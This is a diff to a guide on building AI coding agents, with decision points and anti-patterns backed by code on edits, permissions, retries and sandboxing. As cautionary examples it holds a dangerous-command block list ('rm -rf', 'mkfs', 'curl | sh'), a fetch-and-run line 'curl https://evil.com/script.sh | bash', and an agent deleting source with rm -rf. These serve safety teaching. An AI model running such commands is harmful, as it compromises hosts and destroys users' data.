@@ -1320,40 +1320,944 @@ interface Sandbox {
 **Why:** Agents running arbitrary code are dangerous.
 **Lesson:** If your agent runs code, sandbox it.
 
-### Decision Framework
+### Decision Framework (Deep)
+
+15 decision points for building AI coding agents. Each with conditions, choices, justification, risks, and mitigation.
+
+#### Decision 1: Edit Format
 
 ```
-Q: What type of agent are you building?
-├── Coding agent
-│   ├── Need precise edits? → Edit Formats (Aider)
-│   ├── Need planning? → Architect Pattern (Aider)
-│   ├── Need git integration? → Git-Native Workflow (Aider)
-│   └── Need safety? → Permission System (Claude Code)
-├── Research agent
-│   ├── Need to explore? → Scout Mode (Kilo Code)
-│   └── Need context-aware help? → Reference Guidance (Kilo Code)
-├── General agent
-│   ├── Need scalability? → Effect-TS (OpenCode)
-│   ├── Need orchestration? → Agent-Harness (OpenClaw)
-│   └── Need branching? → Branch Summarization (OpenClaw)
-└── Production agent
-    ├── Need safety? → Container Sandboxing (Codex)
-    ├── Need permissions? → Permission System (Claude Code)
-    └── Need reliability? → Agent-Harness (OpenClaw)
+Q: How should the LLM edit files?
+
+File < 200 lines?
+├── Yes → WholeFile format
+│   Why: LLM sees full context, more accurate for small files
+│   Risk: Token expensive for large files
+│   Mitigation: Only use for small files or new files
+│
+└── No → EditBlock format (SEARCH/REPLACE)
+    Why: Only changes what needs changing, saves tokens
+    Risk: LLM sometimes gets SEARCH text wrong (off by whitespace)
+    Mitigation: Fuzzy match when exact match fails (strip whitespace, normalize)
+    Code:
+      def fuzzy_search(content, search_text):
+          # Try exact first
+          if search_text in content:
+              return search_text
+          # Try normalized
+          normalized = search_text.strip()
+          if normalized in content:
+              return normalized
+          # Try line-by-line match
+          for line in content.split('\n'):
+              if line.strip() == search_text.strip():
+                  return line
+          return None
+
+Multiple files at once?
+├── 1-3 files → EditBlock per file
+├── 4-10 files → Architect pattern first (plan, then edit)
+└── > 10 files → Scout mode (read all, plan, then edit)
 ```
 
-### Anti-Patterns from 18 Agents
+#### Decision 2: Agent Architecture
 
-1. **Raw LLM Output** → Use edit instructions (Aider)
-2. **Single Agent Does Everything** → Architect + Editor (Aider)
-3. **No Version Control** → Auto-commit (Aider)
-4. **Untyped Errors** → Typed errors (OpenCode)
-5. **Monolithic Agent** → Agent-Harness separation (OpenClaw)
-6. **Linear Compaction** → Branch-aware compaction (OpenClaw)
-7. **No Permission Levels** → Auto/Confirm/Block (Claude Code)
-8. **Jump to Editing** → Scout mode first (Kilo Code)
-9. **Generic Prompts** → Context-aware references (Kilo Code)
-10. **Unsandboxed Execution** → Container isolation (Codex)
+```
+Q: Single agent or multi-agent?
+
+Task is simple (read file, answer question)?
+└── Single agent loop
+    Why: Simple tasks don't need orchestration overhead
+    Risk: None
+
+Task involves planning + execution?
+└── Architect + Editor (Aider pattern)
+    Why: LLMs plan better than they edit. Separating improves quality.
+    Risk: Two LLM calls = 2x cost
+    Mitigation: Use cheap model for planning, expensive for editing
+    Code:
+      # Architect uses gpt-4o-mini (cheap, good at planning)
+      architect = Agent(model="gpt-4o-mini", system=ARCHITECT_PROMPT)
+      plan = architect.run("Plan changes for: " + task)
+      
+      # Editor uses gpt-4o (expensive, good at code)
+      editor = Agent(model="gpt-4o", system=EDITOR_PROMPT)
+      editor.run("Apply this plan: " + plan)
+
+Task involves research + coding?
+└── Scout + Coder (Kilo Code pattern)
+    Why: Research phase finds context, coding phase applies changes
+    Risk: Scout might miss relevant files
+    Mitigation: Use grep/find to identify candidate files first
+```
+
+#### Decision 3: Git Integration
+
+```
+Q: Should the agent auto-commit changes?
+
+Working in a git repo?
+├── Yes → Auto-commit after every edit
+│   Why: Every change is tracked, user can git undo
+│   Risk: Commit history gets noisy (many small commits)
+│   Mitigation: Squash commits before push
+│   Code:
+│     def auto_commit(repo, files, message):
+│         for f in files:
+│             repo.git.add(f)
+│         repo.index.commit(f"[agent] {message}")
+│
+└── No → Manual commit
+    Why: No git = no auto-commit possible
+    Risk: Changes can be lost if agent crashes
+    Mitigation: Save session state periodically
+
+User doing experimental work?
+├── Yes → Create branch first
+│   Why: Easy to discard all changes if experiment fails
+│   Code:
+│     repo.git.checkout('-b', f'agent-experiment-{timestamp}')
+│
+└── No → Work on current branch
+```
+
+#### Decision 4: Permission Levels
+
+```
+Q: How should tools be permissioned?
+
+Tool reads data (read_file, search, grep)?
+└── AUTO — execute without asking
+    Why: Reading is safe, no side effects
+    Risk: Could read sensitive files
+    Mitigation: Block specific paths (/etc/shadow, .env)
+
+Tool writes data (write_file, edit)?
+├── Development environment → AUTO
+│   Why: Dev is safe, user can undo
+│
+└── Production environment → CONFIRM
+    Why: Production writes need human oversight
+    Code:
+      if environment == "production":
+          confirmed = await ask_user(f"Write to {path}?")
+          if not confirmed:
+              return "User declined"
+
+Tool executes code (bash, eval)?
+├── Simple commands (ls, cat, grep) → AUTO
+├── Complex commands (npm, pip, git) → CONFIRM
+└── Dangerous commands (rm, curl|sh) → BLOCK
+    Code:
+      DANGEROUS = ["rm -rf", "mkfs", "dd if=", "curl | sh"]
+      for pattern in DANGEROUS:
+          if pattern in command:
+              return "BLOCKED: dangerous command"
+
+Tool deletes data?
+└── BLOCK — never auto-execute
+    Why: Deletion is irreversible without backups
+    Mitigation: Always ask, suggest backup first
+```
+
+#### Decision 5: Context Window Strategy
+
+```
+Q: How to handle long conversations?
+
+Conversation < 50% of context window?
+└── No action needed
+    Why: Plenty of room
+
+Conversation 50-80% of context window?
+├── Option A: Sliding window (drop oldest messages)
+│   Why: Simple, fast
+│   Risk: Loses important early context
+│   Mitigation: Keep system prompt + first user message always
+│
+├── Option B: Summarize old messages
+│   Why: Preserves key information
+│   Risk: Summary might miss details
+│   Mitigation: Keep last 10 messages verbatim, summarize the rest
+│   Code:
+│     if len(messages) > KEEP_RECENT:
+│         old = messages[:-KEEP_RECENT]
+│         recent = messages[-KEEP_RECENT:]
+│         summary = await llm.summarize(old)
+│         messages = [system(summary)] + recent
+│
+└── Option C: Hierarchical (short-term + long-term memory)
+    Why: Best context preservation
+    Risk: Complex to implement
+    Mitigation: Use vector store for long-term memory
+
+Conversation > 90% of context window?
+└── Force compaction (summarize immediately)
+    Why: Agent will crash if context overflows
+    Code:
+      if token_count > max_tokens * 0.9:
+          messages = await compact(messages, model)
+```
+
+#### Decision 6: Error Handling
+
+```
+Q: How to handle errors?
+
+LLM API error (429, 500, timeout)?
+├── Retry with exponential backoff
+│   Why: Most API errors are transient
+│   Code:
+│     for attempt in range(max_retries):
+│         try:
+│             return await provider.chat(messages)
+│         except RateLimitError:
+│             await asyncio.sleep(2 ** attempt)
+│         except ServerError:
+│             await asyncio.sleep(2 ** attempt)
+│     raise AllRetriesFailed()
+│
+└── Fallback to different provider
+    Why: If one provider is down, another might work
+    Code:
+      try:
+          return await openai.chat(messages)
+      except:
+          return await anthropic.chat(messages)
+
+Tool execution error?
+├── Critical tool (must succeed) → Retry 3x, then abort
+├── Non-critical tool → Log error, continue without result
+└── User-visible error → Show error to user, ask for guidance
+    Code:
+      try:
+          result = await tool.execute(args)
+      except ToolError as e:
+          if tool.critical:
+              raise
+          return ToolResult(error=str(e), is_error=True)
+
+LLM returns malformed output?
+├── JSON parse error → Ask LLM to fix (retry with error context)
+├── Missing required fields → Ask LLM to complete
+└── Completely wrong format → Fall back to simpler prompt
+```
+
+#### Decision 7: Streaming
+
+```
+Q: Should the agent stream responses?
+
+User is waiting in real-time (chat, terminal)?
+├── Yes → Stream token by token
+│   Why: User sees progress, feels faster
+│   Risk: Harder to handle tool calls mid-stream
+│   Mitigation: Buffer tool calls until complete
+│
+└── No → Wait for full response
+    Why: Simpler implementation
+    Risk: User waits with no feedback
+    Mitigation: Show "thinking..." indicator
+
+Agent running in background (batch, CI)?
+└── No streaming needed
+    Why: No one is watching
+    Benefit: Simpler code, easier error handling
+```
+
+#### Decision 8: Parallel vs Sequential Tool Execution
+
+```
+Q: Should tools run in parallel?
+
+Tools are independent (read file A + read file B)?
+├── Yes → Run in parallel
+│   Why: 2x faster
+│   Code:
+│     results = await asyncio.gather(
+│         tool_a.execute(args_a),
+│         tool_b.execute(args_b),
+│     )
+│
+└── No if tools depend on each other
+    Example: Read file → Edit file (must be sequential)
+    Code:
+      result_a = await read_file(path)
+      result_b = await edit_file(path, result_a + edits)
+
+How many parallel tools?
+├── 2-5 → Fine, most providers support it
+├── 6-10 → Check provider limits (OpenAI max 10 tool calls)
+└── > 10 → Batch into groups of 5
+```
+
+#### Decision 9: Compaction Trigger
+
+```
+Q: When to compact the conversation?
+
+Token count < 60% of max?
+└── Don't compact
+    Why: Plenty of room, compaction loses info
+
+Token count 60-80%?
+├── Option A: Compact proactively
+│   Why: Prevents sudden forced compaction later
+│   Risk: Might compact too early, losing useful context
+│
+└── Option B: Wait until 80%
+    Why: Preserve as much context as possible
+    Risk: If next message is large, forced compaction
+
+Token count > 80%?
+└── Compact immediately
+    Why: Must prevent context overflow
+    Code:
+      if tokens > max_tokens * 0.8:
+          messages = await compact(messages, model=model)
+
+What to compact?
+├── Summarize old messages (preserves meaning)
+├── Drop tool results (can re-execute if needed)
+└── Keep system prompt + recent 10 messages always
+```
+
+#### Decision 10: Model Selection
+
+```
+Q: Which model for which task?
+
+Simple task (format code, fix typo)?
+└── Use cheap model (gpt-4o-mini, claude-haiku)
+    Why: 10x cheaper, fast, good enough
+    Cost: $0.15/1M input tokens
+
+Complex task (refactor architecture, debug)?
+└── Use expensive model (gpt-4o, claude-sonnet)
+    Why: Better reasoning, fewer mistakes
+    Cost: $5/1M input tokens
+
+Code-specific task?
+└── Use code-optimized model
+    Why: Better at code generation and understanding
+    Options: claude-sonnet (best for code), gpt-4o (good all-round)
+
+Planning task?
+└── Use fast model (gpt-4o-mini)
+    Why: Planning needs reasoning, not code precision
+    Save expensive model for execution
+
+Adaptive selection:
+    def select_model(task_type, complexity):
+        if task_type == "simple":
+            return "gpt-4o-mini"
+        elif task_type == "code" and complexity > 0.7:
+            return "claude-sonnet-4"
+        else:
+            return "gpt-4o"
+```
+
+#### Decision 11: Sandboxing
+
+```
+Q: Should code execution be sandboxed?
+
+Agent runs user-provided code?
+└── YES — always sandbox
+    Why: Arbitrary code execution is dangerous
+    Options:
+    - Docker container (most secure)
+    - E2B sandbox (cloud, easy setup)
+    - Restricted subprocess (least secure)
+
+Agent runs its own generated code?
+├── Production → Sandbox (container)
+├── Development → Local with restrictions
+└── Local personal → No sandbox needed
+
+Sandbox configuration:
+    sandbox = {
+        "image": "python:3.11",
+        "mount": "/workspace",
+        "network": "restricted",  # Block external APIs
+        "timeout": 30,            # Kill after 30s
+        "memory": "512m",         # Memory limit
+    }
+```
+
+#### Decision 12: Session Storage
+
+```
+Q: How to persist session data?
+
+Need persistence across restarts?
+├── No → In-memory storage
+│   Why: Fastest, simplest
+│   Risk: Lost on crash
+│
+├── Yes, simple → JSON file storage
+│   Why: Easy to implement, human-readable
+│   Risk: Slow for large sessions
+│
+└── Yes, production → SQLite database
+    Why: Fast queries, concurrent access, ACID
+    Code:
+      CREATE TABLE sessions (
+          id TEXT PRIMARY KEY,
+          branch_id TEXT,
+          data JSON,
+          timestamp REAL
+      )
+
+Need branching?
+├── Yes → Tree-based storage (Pi pattern)
+│   Each entry has parent_id, enables undo/redo
+│
+└── No → Linear storage (append-only log)
+```
+
+#### Decision 13: Tool Timeouts
+
+```
+Q: How long to wait for tool execution?
+
+Read file → 5 seconds
+Write file → 5 seconds
+Bash command → 30 seconds (default)
+Network request → 15 seconds
+LLM call → 60 seconds
+
+    TIMEOUTS = {
+        "read_file": 5,
+        "write_file": 5,
+        "bash": 30,
+        "web_request": 15,
+        "llm_call": 60,
+    }
+
+What happens on timeout?
+├── Non-critical → Return timeout error, continue
+└── Critical → Retry once, then abort
+```
+
+#### Decision 14: Retry Strategy
+
+```
+Q: How to retry failed operations?
+
+Transient error (429, 500, timeout)?
+└── Exponential backoff (1s, 2s, 4s, 8s)
+    Max 3 retries
+    Code:
+      delay = min(base_delay * (2 ** attempt), max_delay)
+      jitter = delay * 0.1 * random()
+      await asyncio.sleep(delay + jitter)
+
+Permanent error (400, 401, 404)?
+└── Don't retry
+    Why: Same error will happen again
+    Action: Report to user immediately
+
+Rate limited (429 with Retry-After header)?
+└── Wait for Retry-After duration
+    Code:
+      if response.status == 429:
+          wait = response.headers.get("Retry-After", 5)
+          await asyncio.sleep(int(wait))
+
+Tool execution failed?
+├── First failure → Retry immediately
+├── Second failure → Retry with delay
+└── Third failure → Report error, continue without tool
+```
+
+#### Decision 15: Logging Level
+
+```
+Q: How much to log?
+
+Development?
+└── DEBUG — log everything
+    - LLM calls with full prompt
+    - Tool executions with args and results
+    - Timing for every operation
+    - Token counts
+
+Staging?
+└── INFO — log key events
+    - LLM calls (model, tokens)
+    - Tool executions (name, duration)
+    - Errors with context
+
+Production?
+└── WARNING — log only problems
+    - Errors and retries
+    - Timeouts
+    - Permission denials
+```
+
+### Anti-Patterns (Deep)
+
+15 anti-patterns from studying 18 agents. Each with what, why, real failure, solution, and code.
+
+#### Anti-Pattern 1: Raw LLM Output
+
+```markdown
+WHAT: Let LLM write entire files instead of edit instructions
+
+WHY WRONG:
+- LLM hallucinates parts that don't need changing
+- File 500 lines → LLM rewrites 500 → 490 lines identical
+- The 10 changed lines are sometimes wrong too
+
+REAL FAILURE:
+LLM: "I've edited main.py"
+Reality: LLM rewrote main.py, forgot old imports
+Result: Code broken, missing import statement
+
+SOLUTION: Use SEARCH/REPLACE edit format
+Code:
+  # ❌ Wrong
+  new_content = llm.generate(f"Rewrite this file:\n{content}")
+  
+  # ✅ Right
+  edits = llm.generate(f"Generate edits:\n{content}")
+  for edit in edits:
+      content = content.replace(edit.search, edit.replace)
+
+WHEN TO WRITE FULL FILE:
+- File < 50 lines
+- Brand new file (doesn't exist yet)
+- User explicitly asks for rewrite
+```
+
+#### Anti-Pattern 2: Single Agent Does Everything
+
+```markdown
+WHAT: One agent handles planning AND execution
+
+WHY WRONG:
+- LLMs plan well but edit poorly (or vice versa)
+- Mixing planning and editing in one prompt confuses the model
+- Planning requires reasoning, editing requires precision
+
+REAL FAILURE:
+User: "Add authentication to the API"
+Agent: [writes 500 lines of auth code in one shot]
+Result: Missing edge cases, inconsistent with existing codebase
+
+SOLUTION: Separate architect and editor
+Code:
+  # Architect plans
+  plan = architect_agent.run(
+      f"Plan auth implementation for:\n{codebase_context}"
+  )
+  
+  # Editor executes plan precisely
+  for step in plan.steps:
+      editor_agent.run(f"Apply: {step}")
+
+WHEN SINGLE AGENT IS OK:
+- Simple tasks (read file, fix typo)
+- Tasks that don't need planning
+```
+
+#### Anti-Pattern 3: No Version Control Integration
+
+```markdown
+WHAT: Agent edits files without git tracking
+
+WHY WRONG:
+- Can't undo agent mistakes
+- No audit trail
+- Agent crashes = changes lost
+
+REAL FAILURE:
+Agent edited 15 files, then crashed on file 16
+User: "Where are my changes?"
+Result: Files 1-15 changed, no record of what changed
+
+SOLUTION: Auto-commit after every edit
+Code:
+  def edit_file(path, edits):
+      content = apply_edits(path, edits)
+      write_file(path, content)
+      auto_commit(repo, [path], f"Edit {path}")
+
+WHEN NOT TO AUTO-COMMIT:
+- Non-git projects (no repo)
+- User explicitly says "don't commit"
+```
+
+#### Anti-Pattern 4: Untyped Errors
+
+```markdown
+WHAT: Catch all errors with generic try/catch
+
+WHY WRONG:
+- Can't distinguish between error types
+- Can't handle different errors differently
+- Error messages are unhelpful
+
+REAL FAILURE:
+try:
+    result = await provider.chat(messages)
+except Exception as e:
+    print(f"Error: {e}")
+# Is this a rate limit? Auth error? Network error?
+# Can't retry appropriately without knowing
+
+SOLUTION: Typed errors with specific handling
+Code:
+  class ProviderError(Exception): pass
+  class RateLimitError(ProviderError): pass
+  class AuthError(ProviderError): pass
+  class NetworkError(ProviderError): pass
+  
+  try:
+      result = await provider.chat(messages)
+  except RateLimitError:
+      await asyncio.sleep(retry_after)
+  except AuthError:
+      await refresh_token()
+  except NetworkError:
+      return await fallback_provider.chat(messages)
+```
+
+#### Anti-Pattern 5: Monolithic Agent
+
+```markdown
+WHAT: Agent class handles everything (tools, session, LLM, UI)
+
+WHY WRONG:
+- Impossible to test individual components
+- Changes to one feature break others
+- 2000+ line file that nobody understands
+
+REAL FAILURE:
+Agent class: 3000 lines, handles tools + session + LLM + UI + git
+Developer wants to change session storage
+Result: Breaks tool execution (hidden dependency)
+
+SOLUTION: Agent-Harness separation
+Code:
+  # agent.ts — pure logic (200 lines)
+  class Agent:
+      async run(messages, tools):
+          response = await llm.chat(messages, tools)
+          if response.has_tool_calls:
+              results = await execute_tools(response.tool_calls)
+              return await self.run(messages + results, tools)
+          return response
+  
+  # harness.ts — orchestration (500 lines)
+  class AgentHarness:
+      async prompt(text):
+          session.append(text)
+          messages = session.build_context()
+          response = await agent.run(messages, tools)
+          session.save(response)
+          return response
+```
+
+#### Anti-Pattern 6: Linear Compaction
+
+```markdown
+WHAT: Summarize messages in order (oldest first)
+
+WHY WRONG:
+- Tree-based sessions have branches
+- Summarizing linearly loses branch context
+- Branch that diverged at message 50 loses everything after
+
+REAL FAILURE:
+Session has branch at message 50: main + experiment
+Compaction summarizes messages 1-40
+Branch that diverged at 50: all context after 50 is lost
+Result: Agent forgets what the experiment was about
+
+SOLUTION: Branch-aware compaction
+Code:
+  def compact(session):
+      branches = session.get_branches()
+      for branch in branches:
+          if branch.needs_compaction():
+              summary = summarize(branch.messages)
+              branch.replace_old_messages(summary)
+```
+
+#### Anti-Pattern 7: No Permission Levels
+
+```markdown
+WHAT: All tools treated equally (no risk assessment)
+
+WHY WRONG:
+- Reading a file is safe
+- Writing a file needs oversight
+- Deleting a file is dangerous
+- Running rm -rf is catastrophic
+
+REAL FAILURE:
+Agent: "I'll clean up the project"
+Agent runs: rm -rf ./src (instead of rm -rf ./tmp)
+Result: Source code deleted
+
+SOLUTION: Permission levels per tool
+Code:
+  PERMISSIONS = {
+      "read_file": "auto",
+      "write_file": "confirm",
+      "bash": "confirm",
+      "delete_file": "block",
+  }
+  
+  async def execute_tool(name, args):
+      level = PERMISSIONS.get(name, "confirm")
+      if level == "block":
+          return Error("Tool blocked")
+      if level == "confirm":
+          if not await ask_user(f"Execute {name}?"):
+              return Error("User declined")
+      return await tool.execute(args)
+```
+
+#### Anti-Pattern 8: Jump to Editing
+
+```markdown
+WHAT: Read one file, edit immediately, repeat
+
+WHY WRONG:
+- Missing context from related files
+- Edits break imports, dependencies
+- Agent doesn't understand architecture
+
+REAL FAILURE:
+User: "Add a new API endpoint"
+Agent: reads routes.py, adds endpoint
+Result: Missing model, missing migration, broken imports
+Because: Agent didn't read models.py, db.py, middleware.py first
+
+SOLUTION: Scout mode — read many files first
+Code:
+  async def scout_and_edit(task, codebase):
+      # Phase 1: Scout
+      relevant_files = await find_relevant_files(task, codebase)
+      context = ""
+      for f in relevant_files:
+          context += f"--- {f} ---\n{read_file(f)}\n"
+      
+      # Phase 2: Plan
+      plan = await architect.plan(task, context)
+      
+      # Phase 3: Execute
+      for step in plan.steps:
+          await editor.edit(step)
+```
+
+#### Anti-Pattern 9: Generic System Prompt
+
+```markdown
+WHAT: Same system prompt for all tasks
+
+WHY WRONG:
+- Coding task needs code-focused prompt
+- Research task needs search-focused prompt
+- Generic prompt wastes tokens on irrelevant instructions
+
+REAL FAILURE:
+System prompt: "You are a helpful assistant. You can read files, write files..."
+User: "Search the web for API documentation"
+Agent: Uses file tools instead of web search
+Because: System prompt emphasizes file tools
+
+SOLUTION: Context-aware prompt selection
+Code:
+  def select_prompt(task_type):
+      prompts = {
+          "coding": CODING_PROMPT,
+          "research": RESEARCH_PROMPT,
+          "debugging": DEBUG_PROMPT,
+      }
+      return prompts.get(task_type, DEFAULT_PROMPT)
+```
+
+#### Anti-Pattern 10: Unsandboxed Execution
+
+```markdown
+WHAT: Run arbitrary code directly on host machine
+
+WHY WRONG:
+- Malicious code can access host filesystem
+- Accidental rm -rf can destroy system
+- No resource limits (memory, CPU, time)
+
+REAL FAILURE:
+Agent runs: curl https://evil.com/script.sh | bash
+Result: Host machine compromised
+
+SOLUTION: Container sandboxing
+Code:
+  async def sandboxed_execute(command):
+      container = docker.containers.run(
+          "python:3.11",
+          command=command,
+          volumes={"/workspace": {"bind": "/workspace", "mode": "rw"}},
+          mem_limit="512m",
+          network_mode="none",
+          detach=True,
+      )
+      container.wait(timeout=30)
+      return container.logs()
+```
+
+#### Anti-Pattern 11: No Context Budget
+
+```markdown
+WHAT: Add everything to context without tracking tokens
+
+WHY WRONG:
+- Context window fills up silently
+- Agent crashes mid-conversation
+- No warning before overflow
+
+REAL FAILURE:
+Agent reads 50 files, adds all to context
+Context: 200K tokens (model limit: 128K)
+Result: API error, conversation lost
+
+SOLUTION: Token budget management
+Code:
+  class ContextBudget:
+      def __init__(self, max_tokens):
+          self.max = max_tokens
+          self.used = 0
+      
+      def add(self, text):
+          tokens = count_tokens(text)
+          if self.used + tokens > self.max * 0.8:
+              self.compact()
+          self.used += tokens
+      
+      def compact(self):
+          # Summarize old messages to fit
+          self.messages = summarize_old(self.messages)
+```
+
+#### Anti-Pattern 12: Blocking Tool Execution
+
+```markdown
+WHAT: Tool execution blocks entire agent loop
+
+WHY WRONG:
+- One slow tool = entire agent hangs
+- User can't cancel, can't steer
+- No timeout = infinite wait
+
+REAL FAILURE:
+Agent runs: bash command that waits for user input
+Agent hangs forever
+User: Ctrl+C kills entire session, loses conversation
+
+SOLUTION: Async execution with timeout
+Code:
+  async def execute_with_timeout(tool, args, timeout=30):
+      try:
+          return await asyncio.wait_for(
+              tool.execute(args),
+              timeout=timeout
+          )
+      except asyncio.TimeoutError:
+          return ToolResult(error=f"Tool timed out after {timeout}s")
+```
+
+#### Anti-Pattern 13: No Streaming
+
+```markdown
+WHAT: Wait for full response before showing anything
+
+WHY WRONG:
+- User waits 30 seconds seeing nothing
+- Feels broken, even when working fine
+- User might cancel thinking it's stuck
+
+REAL FAILURE:
+User: "Explain this code"
+Agent: [thinks for 15 seconds, then shows full response]
+User: [already cancelled at 10 seconds]
+
+SOLUTION: Stream tokens as they arrive
+Code:
+  async def stream_response(messages):
+      buffer = ""
+      async for chunk in provider.stream(messages):
+          buffer += chunk
+          print(chunk, end="", flush=True)
+      return buffer
+```
+
+#### Anti-Pattern 14: Hardcoded Provider
+
+```markdown
+WHAT: Code only works with one LLM provider
+
+WHY WRONG:
+- Provider goes down = agent useless
+- Can't switch to cheaper model for simple tasks
+- Can't compare providers
+
+REAL FAILURE:
+Agent hardcoded to OpenAI
+OpenAI has outage
+Agent completely unusable for 2 hours
+
+SOLUTION: Provider abstraction
+Code:
+  class Provider(ABC):
+      @abstractmethod
+      async def chat(self, messages, tools=None): ...
+  
+  class OpenAIProvider(Provider): ...
+  class AnthropicProvider(Provider): ...
+  
+  # Fallback chain
+  providers = [OpenAIProvider(), AnthropicProvider()]
+  for p in providers:
+      try:
+          return await p.chat(messages)
+      except:
+          continue
+```
+
+#### Anti-Pattern 15: No User Feedback Loop
+
+```markdown
+WHAT: Agent runs autonomously without checking with user
+
+WHY WRONG:
+- Agent might interpret task wrong
+- User can't correct course
+- Agent does 10 wrong steps before user can stop
+
+REAL FAILURE:
+User: "Fix the bug in auth.py"
+Agent: [reads auth.py, identifies wrong bug, rewrites wrong section]
+User: "No, that's not the bug"
+Agent: [already committed the wrong fix]
+
+SOLUTION: Checkpoint with user at key points
+Code:
+  async def run_with_checkpoints(task):
+      plan = await plan_task(task)
+      print(f"Plan: {plan}")
+      if not await confirm("Proceed with this plan?"):
+          return "User declined plan"
+      
+      for step in plan.steps:
+          result = await execute_step(step)
+          if step.needs_confirmation:
+              if not await confirm(f"Step done: {result}. Continue?"):
+                  return "User stopped at step"
+```
 
 ---
 
